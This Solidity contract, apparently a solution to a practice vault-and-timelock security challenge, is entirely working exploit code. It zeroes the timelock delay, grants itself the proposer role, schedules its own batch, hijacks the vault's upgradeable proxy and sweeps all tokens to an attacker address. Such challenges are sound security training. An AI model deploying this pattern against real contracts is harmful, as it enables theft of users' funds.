// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "./ClimberTimelock.sol";
import "./ClimberVault.sol";

contract ClimberExploit is UUPSUpgradeable {
    IERC20 immutable token;
    ClimberTimelock immutable timelock;
    ClimberVault immutable vault;
    address immutable attacker;

    constructor(
        address _token,
        address payable _timelock,
        address _vault,
        address _attacker
    ) {
        token = IERC20(_token);
        timelock = ClimberTimelock(_timelock);
        vault = ClimberVault(_vault);
        attacker = _attacker;
    }

    function buildProposal()
        public
        view
        returns (
            address[] memory,
            uint256[] memory,
            bytes[] memory
        )
    {
        address[] memory targets = new address[](5);
        uint256[] memory values = new uint256[](5);
        bytes[] memory dataElements = new bytes[](5);

        // call updateDelay and change the delay valu to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(
            ClimberTimelock.updateDelay.selector,
            0
        );

        // make this contract as PROPOSER_ROLE
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(
            AccessControl.grantRole.selector,
            timelock.PROPOSER_ROLE(),
            address(this)
        );

        // call this contract to schedule the proposal
        targets[2] = address(this);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(
            ClimberExploit.scheduleProposal.selector
        );

        // update proxy to use this contract as implementation instead
        targets[3] = address(vault);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeTo.selector,
            address(this)
        );

        // take all funds
        targets[4] = address(vault);
        values[4] = 0;
        dataElements[4] = abi.encodeWithSelector(
            ClimberExploit.sweepFunds.selector
        );

        return (targets, values, dataElements);
    }

    function executeProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.execute(targets, values, dataElements, 0);
    }

    function scheduleProposal() external {
        (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements
        ) = buildProposal();
        timelock.schedule(targets, values, dataElements, 0);
    }

    function sweepFunds() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }

    // Required function for inheriting from UUPSUpgradeable.
    function _authorizeUpgrade(address newImplementation) internal override {}
}
